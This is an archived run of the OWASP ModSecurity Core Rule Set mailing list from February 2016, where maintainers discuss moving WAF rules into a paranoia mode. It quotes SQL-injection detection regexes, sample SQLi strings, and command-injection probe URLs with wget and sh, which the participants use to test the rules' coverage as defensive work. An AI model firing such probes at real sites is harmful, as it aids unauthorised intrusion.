> > This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
> > _______________________________________________
> > Owasp-modsecurity-core-rule-set mailing list
> > Owasp-modsecurity-core-rule-set at lists.owasp.org
> > https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set
> 
> -- 
> mailto:christian.folini at netnea.com
> http://www.christian-folini.ch
> twitter: @ChrFolini
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

-- 
mailto:christian.folini at netnea.com
http://www.christian-folini.ch
twitter: @ChrFolini

From christian.folini at netnea.com  Fri Feb 12 21:22:39 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Fri, 12 Feb 2016 22:22:39 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 970901 / 950100 (Application returning 500)
In-Reply-To: <20160202084457.GE29931@elias>
References: <20160202084457.GE29931@elias>
Message-ID: <20160212212239.GD32631@elias>

Hello,

There has not been much of a discussion here. Thinking this over once or
twice again, I think the idea of the paranoia mode is to make things
easier for the inexperienced admin.

In this light, I think it is best to move this rule to paranoia mode.
This will allow for easier blind sqli attacks, but it does not cloak
a backend error with a 403.

Unless somebody objects with new arguments of course. If you do object, 
please move quickly now.

Best,

Christian



On Tue, Feb 02, 2016 at 09:44:57AM +0100, Christian Folini wrote:
> Hi!
> 
> This is a juicy one.
> 
> Rule in 2.2.9:
> SecRule RESPONSE_STATUS "^5\d{2}$" "phase:4,rev:'2',ver:'OWASP_CRS/2.2.9',maturity:'9',accuracy:'9',t:none,capture,ctl:auditLogParts=+E,block,msg:'The application is not available',logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',id:'970901',tag:'WASCTC/WASC-13',tag:'OWASP_TOP_10/A6',tag:'PCI/6.5.6',severity:'3',setvar:'tx.msg=%{rule.msg}',setvar:tx.outbound_anomaly_score=+%{tx.error_anomaly_score},setvar:tx.anomaly_score=+%{tx.error_anomaly_score},setvar:tx.%{rule.id}-AVAILABILITY/APP_NOT_AVAIL-%{matched_var_name}=%{tx.0}"
> 
> Rule in 3.0.0rc1:
> SecRule RESPONSE_STATUS "^5\d{2}$" \
> 	"phase:response,\
> 	rev:'3',\
> 	ver:'OWASP_CRS/3.0.0',\
> 	maturity:'9',\
> 	accuracy:'9',\
> 	t:none,\
> 	capture,\
> 	ctl:auditLogParts=+E,\
> 	block,\
> 	msg:'The Application Returned a 500-Level Status Code',\
> 	logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\
> 	id:'950100',\
> 	tag:'application-multi',\
> 	tag:'language-multi',\
> 	tag:'platform-multi',\
> 	tag:'attack-information disclosure',\
> 	tag:'WASCTC/WASC-13',\
> 	tag:'OWASP_TOP_10/A6',\
> 	tag:'PCI/6.5.6',\
> 	severity:'ERROR',\
> 	setvar:'tx.msg=%{rule.msg}',\
> 	setvar:tx.outbound_anomaly_score=+%{tx.error_anomaly_score},\
> 	setvar:tx.anomaly_score=+%{tx.error_anomaly_score},\
> 	setvar:tx.%{rule.id}-AVAILABILITY/APP_NOT_AVAIL-%{matched_var_name}=%{tx.0}"
> 
> Obviously we check the HTTP response status code and trigger an alert on 
> a status 500. It is one of the rare rules with anomaly score error (=4)
> as opposed to critical (=5).
> 
> Franziska thinks this is too generic and cloaks backend misbehaviour.
> (If you have a problem with the error page, then replace it!), but let's
> not hide the fact of the error from the client.
> 
> Now Walter thinks this rule plays a role when defending against blind
> attacks where the difference between 403 (likely blocked by ModSecurity) 
> and 500 (passed ModSecurity, but crashed on backend) gives an attacker
> important information.
> 
> Initially, I wanted to push this rule into paranoia mode. But now I am
> not so sure anymore for Walter does have a point.
> 
> However, the inexperienced administrator could have a hard time
> indentifying the 403 status as a backend failure. So maybe it is still
> a paranoia candidate despite it's supportive role when defending against
> blind injection attacks.
> 
> More brain cycles are definitely needed here!
> 
> Christian
> 
> 
> -- 
> mailto:christian.folini at netnea.com
> http://www.christian-folini.ch
> twitter: @ChrFolini
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

-- 
mailto:christian.folini at netnea.com
http://www.christian-folini.ch
twitter: @ChrFolini

From christian.folini at netnea.com  Fri Feb 12 21:24:21 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Fri, 12 Feb 2016 22:24:21 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 981244 / 942180 and 981248 / 942210 (More SQL stuff)
In-Reply-To: <20160202091515.GF29931@elias>
References: <20160202091515.GF29931@elias>
Message-ID: <20160212212421.GE32631@elias>

And the final one:

There has not been any opposition to moving these two rules to
paranoia mode. So this is what we are going to do, until we
see a last minute intervention.

Ahoj,

Christian

On Tue, Feb 02, 2016 at 10:15:15AM +0100, Christian Folini wrote:
> Dear all,
> 
> The case with 981244 / 942180 (Detects basic SQL authentication
> bypass attempts 1/3) and 981242 / 942210 (Detects chaines SQLI injection
> attempts 1/2) is similar.
> 
> I think they warrant for frequent or very frequent false positives and
> Walter thinks they don't.
> 
> Rule 2.2.X: 981244:
> SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|!REQUEST_COOKIES:/_pk_ref/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* "(?i:(?i:\d[\"'`???]\s+[\"'`???]\s+\d)|(?:^admin\s*?[\"'`???]|(\/\*)+[\"'`???]+\s?(?:--|#|\/\*|{)?)|(?:[\"'`???]\s*?\b(x?or|div|like|between|and)\b\s*?[+<>=(),-]\s*?[\d\"'`???])|(?:[\"'`???]\s*?[^\w\s]?=\s*?[\"'`???])|(?:[\"'`???]\W*?[+=]+\W*?[\"'`???])|(?:[\"'`???]\s*?[!=|][\d\s!=+-]+.*?[\"'`???(].*?$)|(?:[\"'`???]\s*?[!=|][\d\s!=]+.*?\d+$)|(?:[\"'`???]\s*?like\W+[\w\"'`???(])|(?:\sis\s*?0\W)|(?:where\s[\s\w\.,-]+\s=)|(?:[\"'`???][<>~]+[\"'`???]))" "phase:2,capture,t:none,t:urlDecodeUni,block,msg:'Detects basic SQL authentication bypass attempts 1/3',id:'981244',tag:'OWASP_CRS/WEB_ATTACK/SQL_INJECTION',logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',severity:'2',setvar:'tx.msg=%{rule.id}-%{rule.msg}',setvar:tx.sql_injection_score=+1,setvar:tx.anomaly_score=+%{tx.critical_anomaly_score},setvar:'tx.%{tx.msg}-OWASP_CRS/WEB_ATTACK/SQLI-%{matched_var_name}=%{tx.0}'"
> 
> Rule 3.0.0rc1: 942180:
> SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* "(?i:(?i:\d[\"'`]\s+[\"'`]\s+\d)|(?:^admin\s*?[\"'`]|(\/\*)+[\"'`]+\s?(?:--|#|\/\*|{)?)|(?:[\"'`]\s*?(x?or|div|like|between|and)[\w\s-]+\s*?[+<>=(),-]\s*?[\d\"'`])|(?:[\"'`]\s*?[^\w\s]?=\s*?[\"'`])|(?:[\"'`]\W*?[+=]+\W*?[\"'`])|(?:[\"'`]\s*?[!=|][\d\s!=+-]+.*?[\"'`(].*?$)|(?:[\"'`]\s*?[!=|][\d\s!=]+.*?\d+$)|(?:[\"'`]\s*?like\W+[\w\"'`(])|(?:\sis\s*?0\W)|(?:where\s[\s\w\.,-]+\s=)|(?:[\"'`][<>~]+[\"'`]))" \
> 	"phase:request,\
>         rev:'2',\
>         ver:'OWASP_CRS/3.0.0',\
>         maturity:'9',\
>         accuracy:'8',\
> 	capture,\
> 	t:none,t:urlDecodeUni,\
> 	block,\
> 	msg:'Detects basic SQL authentication bypass attempts 1/3',\
> 	id:'942180',\
> 	tag:'application-multi',\
> 	tag:'language-mutli',\
> 	tag:'platform-multi',\
> 	tag:'attack-sqli',\
> 	tag:'OWASP_CRS/WEB_ATTACK/SQL_INJECTION',\
> 	logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\
> 	severity:'CRITICAL',\
> 	setvar:'tx.msg=%{rule.msg}',\
> 	setvar:tx.sql_injection_score=+%{tx.critical_anomaly_score},\
> 	setvar:tx.anomaly_score=+%{tx.critical_anomaly_score},\
> 	setvar:'tx.%{rule.id}-OWASP_CRS/WEB_ATTACK/SQLI-%{matched_var_name}=%{tx.0}'"
> 
> 
> And here is the 2nd pair with the same issue:
> 
> Rule 2.2.X: 981248:
> SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|!REQUEST_COOKIES:/_pk_ref/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* "(?i:(?:@.+=\s*?\(\s*?select)|(?:\d+\s*?(x?or|div|like|between|and)\s*?\d+\s*?[\-+])|(?:\/\w+;?\s+(?:having|and|x?or|div|like|between|and|select)\W)|(?:\d\s+group\s+by.+\()|(?:(?:;|#|--)\s*?(?:drop|alter))|(?:(?:;|#|--)\s*?(?:update|insert)\s*?\w{2,})|(?:[^\w]SET\s*?@\w+)|(?:(?:n?and|x?x?or|div|like|between|and|not |\|\||\&\&)[\s(]+\w+[\s)]*?[!=+]+[\s\d]*?[\"'`???=()]))" "phase:2,capture,t:none,t:urlDecodeUni,block,msg:'Detects chained SQL injection attempts 1/2',id:'981248',tag:'OWASP_CRS/WEB_ATTACK/SQL_INJECTION',logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',severity:'2',setvar:'tx.msg=%{rule.id}-%{rule.msg}',setvar:tx.sql_injection_score=+1,setvar:tx.anomaly_score=+%{tx.critical_anomaly_score},setvar:'tx.%{tx.msg}-OWASP_CRS/WEB_ATTACK/SQLI-%{matched_var_name}=%{tx.0}'"
> 
> 
> Rule 3.0.0rc1: 942180:
> SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* "(?i:(?i:\d[\"'`]\s+[\"'`]\s+\d)|(?:^admin\s*?[\"'`]|(\/\*)+[\"'`]+\s?(?:--|#|\/\*|{)?)|(?:[\"'`]\s*?(x?or|div|like|between|and)[\w\s-]+\s*?[+<>=(),-]\s*?[\d\"'`])|(?:[\"'`]\s*?[^\w\s]?=\s*?[\"'`])|(?:[\"'`]\W*?[+=]+\W*?[\"'`])|(?:[\"'`]\s*?[!=|][\d\s!=+-]+.*?[\"'`(].*?$)|(?:[\"'`]\s*?[!=|][\d\s!=]+.*?\d+$)|(?:[\"'`]\s*?like\W+[\w\"'`(])|(?:\sis\s*?0\W)|(?:where\s[\s\w\.,-]+\s=)|(?:[\"'`][<>~]+[\"'`]))" \
> 	"phase:request,\
>         rev:'2',\
>         ver:'OWASP_CRS/3.0.0',\
>         maturity:'9',\
>         accuracy:'8',\
> 	capture,\
> 	t:none,t:urlDecodeUni,\
> 	block,\
> 	msg:'Detects basic SQL authentication bypass attempts 1/3',\
> 	id:'942180',\
> 	tag:'application-multi',\
> 	tag:'language-mutli',\
> 	tag:'platform-multi',\
> 	tag:'attack-sqli',\
> 	tag:'OWASP_CRS/WEB_ATTACK/SQL_INJECTION',\
> 	logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\
> 	severity:'CRITICAL',\
> 	setvar:'tx.msg=%{rule.msg}',\
> 	setvar:tx.sql_injection_score=+%{tx.critical_anomaly_score},\
> 	setvar:tx.anomaly_score=+%{tx.critical_anomaly_score},\
> 	setvar:'tx.%{rule.id}-OWASP_CRS/WEB_ATTACK/SQLI-%{matched_var_name}=%{tx.0}'"
> 
> 
> 
> Based on my experience running many, many
> sites with the core rules, I would rather move them into paranoia mode.
> Even more so as the other rules in their group are clearer candidates
> for the paranoia mode and leaving them in standard and moving their
> siblings is a bit odd.
> 
> Thoughts?
> 
> Christian
> 
> 
> -- 
> mailto:christian.folini at netnea.com
> http://www.christian-folini.ch
> twitter: @ChrFolini
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

-- 
mailto:christian.folini at netnea.com
http://www.christian-folini.ch
twitter: @ChrFolini

From christian.folini at netnea.com  Sat Feb 13 05:30:26 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Sat, 13 Feb 2016 06:30:26 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten
 controversial candidate 900050 / 910100 (Client IP is from a HIGH Risk
 Country Location)
Message-ID: <20160213053026.GA9613@elias>

Hi there,

It seems I overlooked this candidate, where Franziska said she is unsure
whether we should blog certain countries in a default installation or
not.

The rule does:
  SecRule GEO:COUNTRY_CODE "@pm %{tx.high_risk_country_codes}" 

With tx.high_risk_country_codes being set to 
"UA ID YU LT EG RO BG TR RU PK MY CN"
in modsecurity_crs_10_setup.conf.example.

Depending on your location, requests from the given set of
countried may be desired and not potential attacks. So I think
Franziska has a point.

One resolution would be to leave the rule where it is, but comment
out the definition of the variable in modsecurity_crs_10_setup.conf.example
and provide multiple default variants in the comments.
That could also be performed in combination with the move to 
the paranoia mode.

Opinions?

Christian


-- 
The problem is, if you're not a hacker, 
you can't tell who the good hackers are.
--- Paul Graham

From modsec at spam.lifeforms.nl  Sat Feb 13 19:54:23 2016
From: modsec at spam.lifeforms.nl (Walter Hop)
Date: Sat, 13 Feb 2016 20:54:23 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
	candidate 950120 / 931130 (Possible RFI)
In-Reply-To: <20160210063610.GB8002@elias>
References: <20160202080600.GA29931@elias>
	<44545D09-6265-438E-B743-5564241D5336@spam.lifeforms.nl>
	<20160207192339.GB30297@elias>
	<484E224E-34B2-44FB-B694-EFDD93A5B105@spam.lifeforms.nl>
	<20160210063610.GB8002@elias>
Message-ID: <107A498C-7347-4C83-A6C1-AFA62DC3BA42@spam.lifeforms.nl>

I want to give a FINAL reply about the RFI rule and then I?ll move on to other rules, honestly!
Also for Noel who emailed me about data for this rule.

>> I would hate to see the rule totally disappear from base just on my one FP note though. Maybe more people can check their audit logs for the rule since it?s in CRSv2 too. It does rule out a lot of exploits on legacy / in house PHP apps and attackers try it daily. So it?s a hard call...
> 
> Let's keep it in the base / on the default paranoia level then. Adding the whitelisting you 
> proposed does little harm and is in line with the UUID whitelisting No?l has developed
> for 981173 (lately moved to 
> https://www.owasp.org/index.php/OWASP_ModSec_CRS_Paranoia_Mode_Sibling_981173 <https://www.owasp.org/index.php/OWASP_ModSec_CRS_Paranoia_Mode_Sibling_981173>)


I said I had mostly only whitelisted ARGS:url for this rule. But I lied! After Noel emailed me, I checked logs and I noticed that I had adjusted the rule in my fork of the CRS git repo so it had a lower (non critical) score. So my experience was not the norm.

To try to get some test data, I enabled the rule again on some staging & internal sites to make it critical again. The experience was pretty horrible. There was a lot of breakage, colleagues complaining that I am wasting their time with 403 errors, and now I remember why I had edited this rule... :) As I could have expected, apps that broke were basically anything where a URL is passed.

Some examples:
- Wordpress admin pages, with unpredictable names (e.g. id?s in args name)
- Wordpress multisite (ARGS:option[ping_sites])
- Symfony user profile (ARGS:fos_user_profile_form[website], ARGS:fos_user_registration_form[website])
- vBulletin user profile (ARGS:homepage)
- billing system (ARGS:return/ARGS:cancel/ARGS:notify)

This is just from a few days of people getting 403s. So after this experiment, I?m tending towards saying, this is the type of rule that makes the CRS scary to use, even if the rule is effective against RFI.

Of course if the default paranoia level is nonzero and it stays at that level, we have sorta CRSv2 parity and still a good way to get out of these FP.

-- 
Walter Hop | PGP key: https://lifeforms.nl/pgp

-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160213/953102d2/attachment.html>

From modsec at spam.lifeforms.nl  Sat Feb 13 20:22:12 2016
From: modsec at spam.lifeforms.nl (Walter Hop)
Date: Sat, 13 Feb 2016 21:22:12 +0100
Subject: [Owasp-modsecurity-core-rule-set] Need suggestion for a SQLI
	pattern
In-Reply-To: <BAY180-W45127A9174D4CC144B97C9BAA80@phx.gbl>
References: <20160202080600.GA29931@elias>
	<44545D09-6265-438E-B743-5564241D5336@spam.lifeforms.nl>
	<20160207192339.GB30297@elias>
	<484E224E-34B2-44FB-B694-EFDD93A5B105@spam.lifeforms.nl>
	<20160210063610.GB8002@elias>
	<50EAD64C-BE9D-48FC-AC13-B1053B1A2134@noelzindel.org>
	<20160210082235.GA11645@elias>
	<BAY180-W899BE3E56D16B8C735C9D8BAA80@phx.gbl>
	<D2E1611F.19E65%csanders@trustwave.com>
	<BAY180-W91800DDAB02375AD1AE664BAA80@phx.gbl>
	<D2E1F54E.19ECC%csanders@trustwave.com>
	<BAY180-W45127A9174D4CC144B97C9BAA80@phx.gbl>
Message-ID: <E4367798-A473-4286-98E2-1D28594C06FF@spam.lifeforms.nl>

Hi Richard and others,

Actually your original query (passing ?select A from B?) might even be successful in some cases. For instance, in MySQL, you can have a subquery. However it must appear in parentheses.

For instance this is a valid query:
select * from user where id=(select id from user where admin=1)

So if an application developer does the following, your statement might get executed:
select * from user where id=(injected_parameter)

Now, the libinjection in ModSec 2.9 still tries to do something. It doesn?t think this is SQLi:
"select id from user? (your example)
?delete from foo"

But it does think the following strings are SQLi:
"(select id from user)?
"select id from user where admin=1?
"select id from user where password is null?

It?s still bit of a black box, but I?m collecting many samples and I plan to report any possible coverage test caseas upstream. I think your example is an interesting one that may not cause too many vulnerabilities, but an application that accepts full queries is still very hazardous so in my opinion ideally libinjection should trigger on it.

Cheers!
WH

> On 11 Feb 2016, at 18:50, Richard Lin <hongpinglin at hotmail.com> wrote:
> 
> Thanks Chaim and Christian and I agree that it is bad that a user controls a SQL statement.  I think libinjection covered 'Where' and 'Like' clause as you mentioned.  
> 
> I am trying to judge if libinjection missed a category of attacking model in which the user's input is an independent SQLs which can be invoked by themselves (i.e, without prefix of "1 UNION", '1 or", "1 and", etc)  If that is the case, I would consider to propose a patch. But I am not sure how careless developers can directly take the input as SQL itself. That sounds too naive to be believed :)
> 

-- 
Walter Hop | PGP key: https://lifeforms.nl/pgp

-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160213/acb7f151/attachment.html>

From modsec at spam.lifeforms.nl  Sat Feb 13 20:56:37 2016
From: modsec at spam.lifeforms.nl (Walter Hop)
Date: Sat, 13 Feb 2016 21:56:37 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten
	controversial candidate 900050 / 910100 (Client IP is from a
	HIGH Risk Country Location)
In-Reply-To: <20160213053026.GA9613@elias>
References: <20160213053026.GA9613@elias>
Message-ID: <47F60E45-3C37-4999-A4E0-217F78EBE002@spam.lifeforms.nl>

On 13 Feb 2016, at 06:30, Christian Folini <christian.folini at netnea.com> wrote:
> It seems I overlooked this candidate, where Franziska said she is unsure
> whether we should blog certain countries in a default installation or
> not.
> 
> The rule does:
>  SecRule GEO:COUNTRY_CODE "@pm %{tx.high_risk_country_codes}" 
> 
> With tx.high_risk_country_codes being set to 
> "UA ID YU LT EG RO BG TR RU PK MY CN"
> in modsecurity_crs_10_setup.conf.example.
> 
> Depending on your location, requests from the given set of
> countried may be desired and not potential attacks. So I think
> Franziska has a point.
> 
> One resolution would be to leave the rule where it is, but comment
> out the definition of the variable in modsecurity_crs_10_setup.conf.example
> and provide multiple default variants in the comments.
> That could also be performed in combination with the move to 
> the paranoia mode.
> 
> Opinions?

I agree fully. We shouldn?t make this decision for everyone. I have to admit that I see some listed countries relatively often in bad traffic, but that?s selection bias - in a western european country I won?t see as much business with them, but there are billions of people for who this is compltely normal.

The rule is only at anomaly level. People don?t always seem to understand that though: https://forums.cpanel.net/threads/owasp-900022.452822/
Maybe the comment could be clarified a bit more as to the actual impact.

I don?t know what the performance impact or behavior of the rule is when tx.high_risk_country_codes is empty. If that?s not a problem, we can just comment it out. Otherwise it might be useful to first check if tx.high_risk_country_codes is nonempty in the rule.

Also, Yugoslavia hasn?t existed for a very long time now. :)

-- 
Walter Hop | PGP key: https://lifeforms.nl/pgp

-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160213/09225897/attachment-0001.html>

From christian.folini at netnea.com  Sun Feb 14 06:10:25 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Sun, 14 Feb 2016 07:10:25 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Pull request
	strategy
Message-ID: <20160214061025.GB1855@elias>

Good morning,

We have settled the list of paranoia mode candidates mostly and the
mechanics are also sorted out with only details remaining open.

I am about to start a paranoia mode branch on github (time permitting)
and I am now thinking about how to construct the pull requests.
Given I am not big on git, it makes sense to discuss the best
approach here.

In order to simplify the review, I am planning 4 separate pull requests:
1 - Add paranoia mode mechanics 
2 - Move first rules to paranoia mode 
3 - Add 2.2.X rules to paranoia mode
4 - Add stricter siblings

In detail:
1: update all the files and add the paranoia mode sections
and the skip marker; no rules in the paranoia mode
2: 3.0.0rc1 rules, which have been confirmed paranoia candidates
3: Bring back those 2.2.X rules which have been removed and have
been selected for paranoia mode
4: Clone existing rules into siblings with stricter behaviour

My reasoning is, that smaller pull requests make for simpler reviews.

@Chaim: I think your input is most important here. So are you OK
with this strategy.

Ahoj,

Christian


-- 
It is not power that corrupts but fear.  Fear of losing power corrupts
those who wield it and fear of the scourge of power corrupts those who
are subject to it.
-- Aung San Suu Kyi

From christian.folini at netnea.com  Sun Feb 14 12:42:26 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Sun, 14 Feb 2016 13:42:26 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 950120 / 931130 (Possible RFI)
In-Reply-To: <107A498C-7347-4C83-A6C1-AFA62DC3BA42@spam.lifeforms.nl>
References: <20160202080600.GA29931@elias>
	<44545D09-6265-438E-B743-5564241D5336@spam.lifeforms.nl>
	<20160207192339.GB30297@elias>
	<484E224E-34B2-44FB-B694-EFDD93A5B105@spam.lifeforms.nl>
	<20160210063610.GB8002@elias>
	<107A498C-7347-4C83-A6C1-AFA62DC3BA42@spam.lifeforms.nl>
Message-ID: <20160214124226.GA8350@elias>

Walter,

Thanks for the further testing.

On Sat, Feb 13, 2016 at 08:54:23PM +0100, Walter Hop wrote:
> To try to get some test data, I enabled the rule again on some staging & internal sites to make it critical again. The experience was pretty horrible. There was a lot of breakage, colleagues complaining that I am wasting their time with 403 errors, and now I remember why I had edited this rule... :) As I could have expected, apps that broke were basically anything where a URL is passed.

Really interesting. Our environments are so different. I really
see very few FPs here. But it's not the same type of software
running on the servers.

> This is just from a few days of people getting 403s. So after this experiment, I?m tending towards saying, this is the type of rule that makes the CRS scary to use, even if the rule is effective against RFI.
> 
> Of course if the default paranoia level is nonzero and it stays at that level, we have sorta CRSv2 parity and still a good way to get out of these FP.

I am not sure I understand your last sentence correctly.

If we have most rules at paranoia level 1 and default is
paranoia level 1. Should this rule be a 1 with additional
whitelisting of FPs, or should we assign it a paranoia
level of 2?

I'm OK with both options.

Ahoj,

Christian



-- 
The reasonable man adapts himself to the world; the unreasonable man 
persists in trying to adapt the world to himself. Therefore, all 
progress depends on the unreasonable man.
-- George Bernard Shaw

From modsec at spam.lifeforms.nl  Sun Feb 14 16:38:54 2016
From: modsec at spam.lifeforms.nl (Walter Hop)
Date: Sun, 14 Feb 2016 17:38:54 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
	candidate 950120 / 931130 (Possible RFI)
In-Reply-To: <20160214124226.GA8350@elias>
References: <20160202080600.GA29931@elias>
	<44545D09-6265-438E-B743-5564241D5336@spam.lifeforms.nl>
	<20160207192339.GB30297@elias>
	<484E224E-34B2-44FB-B694-EFDD93A5B105@spam.lifeforms.nl>
	<20160210063610.GB8002@elias>
	<107A498C-7347-4C83-A6C1-AFA62DC3BA42@spam.lifeforms.nl>
	<20160214124226.GA8350@elias>
Message-ID: <0FA048DB-EB7A-416D-9964-FDF72DC6AAB7@spam.lifeforms.nl>

On 14 Feb 2016, at 13:42, Christian Folini <christian.folini at netnea.com> wrote:
> 
> If we have most rules at paranoia level 1 and default is
> paranoia level 1. Should this rule be a 1 with additional
> whitelisting of FPs, or should we assign it a paranoia
> level of 2?
> 
> I'm OK with both options.

OK. Still a hard call but if we set default paranoia level at 1 (sounds good to me) I would say this rule should start at a level of 2.

I was thinking out loud about the principle of CRSv2 users since they might expect this rule to stay. But we should document clearly somewhere what the benefits and drawbacks of the levels are. (Maybe it?s time to start a CHANGES document in the source tree?)

-- 
Walter Hop | PGP key: https://lifeforms.nl/pgp

-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160214/cb553915/attachment.html>

From modsec at spam.lifeforms.nl  Sun Feb 14 17:07:50 2016
From: modsec at spam.lifeforms.nl (Walter Hop)
Date: Sun, 14 Feb 2016 18:07:50 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Pull request
	strategy
In-Reply-To: <20160214061025.GB1855@elias>
References: <20160214061025.GB1855@elias>
Message-ID: <8E088D65-2323-4F25-9719-E0C589B0C642@spam.lifeforms.nl>

Sounds good to me!

Normally it's good etiquette to create one PR per feature, so that if the reviewer has problems with one part (like one individual rule change), they can comment on that and still accept the other 95% instantly. If I maintained it I would have liked separate PRs for parts 2, 3, and 4, but it?s up to Chaim I think.

Cheers!
WH

> On 14 Feb 2016, at 07:10, Christian Folini <christian.folini at netnea.com> wrote:
> 
> Good morning,
> 
> We have settled the list of paranoia mode candidates mostly and the
> mechanics are also sorted out with only details remaining open.
> 
> I am about to start a paranoia mode branch on github (time permitting)
> and I am now thinking about how to construct the pull requests.
> Given I am not big on git, it makes sense to discuss the best
> approach here.
> 
> In order to simplify the review, I am planning 4 separate pull requests:
> 1 - Add paranoia mode mechanics 
> 2 - Move first rules to paranoia mode 
> 3 - Add 2.2.X rules to paranoia mode
> 4 - Add stricter siblings
> 
> In detail:
> 1: update all the files and add the paranoia mode sections
> and the skip marker; no rules in the paranoia mode
> 2: 3.0.0rc1 rules, which have been confirmed paranoia candidates
> 3: Bring back those 2.2.X rules which have been removed and have
> been selected for paranoia mode
> 4: Clone existing rules into siblings with stricter behaviour
> 
> My reasoning is, that smaller pull requests make for simpler reviews.
> 
> @Chaim: I think your input is most important here. So are you OK
> with this strategy.
> 
> Ahoj,
> 
> Christian
> 
> 
> -- 
> It is not power that corrupts but fear.  Fear of losing power corrupts
> those who wield it and fear of the scourge of power corrupts those who
> are subject to it.
> -- Aung San Suu Kyi
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

-- 
Walter Hop | PGP key: https://lifeforms.nl/pgp

-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160214/b9d55591/attachment.html>

From CSanders at trustwave.com  Mon Feb 15 04:07:53 2016
From: CSanders at trustwave.com (Chaim Sanders)
Date: Mon, 15 Feb 2016 04:07:53 +0000
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 950907 / 932100 (System command injection)
In-Reply-To: <20160212211715.GB32631@elias>
References: <20160202081718.GB29931@elias>
	<69CE0D94-2054-443C-8336-033DCCB33934@spam.lifeforms.nl>
	<20160207195530.GC30297@elias> <20160212211715.GB32631@elias>
Message-ID: <D2E6B8F1.1A467%csanders@trustwave.com>

For the record I think this is a good idea but perhaps outside the scope a
bit of the initial RC release. Christian, I suggest we add this to the
To-do for 3.1. Thoughts?

On 2/12/16, 4:17 PM,
"owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
Christian Folini" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
on behalf of christian.folini at netnea.com> wrote:

>Hi there,
>
>There has not been any additional feedback in this thread, but I think
>the question is not settled as of this writing.
>
>Thoughts?
>
>Regs,
>
>Christian
>
>On Sun, Feb 07, 2016 at 08:55:30PM +0100, Christian Folini wrote:
>> Hi there,
>>
>> On Sat, Feb 06, 2016 at 11:04:00PM +0100, Walter Hop wrote:
>> > I like the idea of splitting the file.
>>
>> Cool.
>>
>> > I agree some of the words in os-commands.data seem rather paranoid.
>>Words like "choice", "help", "now? seem of low value and are common in
>>natural text. Also, the large number of Unix-only environments could
>>skip Windows related commands. It?s hard for users to modify these lists
>>as you?d have to hack the CRS, and these huge collections are to
>>maintain anyhow, so I agree we need granularity.
>>
>> Good point.
>>
>> > The rule has some regexp magic to prevent false positives, but the
>>balance is not a complete success in my opinion. For instance, the
>>following URLs don't trigger in CRSv3:
>> > http://vuln/?cmd=wget%20http://example.com/blah.txt
>> > http://vuln/?cmd=sh%20blah.txt
>> >
>> > So it's not as strong as you would want either to prevent some common
>>RCE.
>> > Something like http://vuln/?cmd=Wget%20http://example.com/;%20ecHo
>>does trigger it.
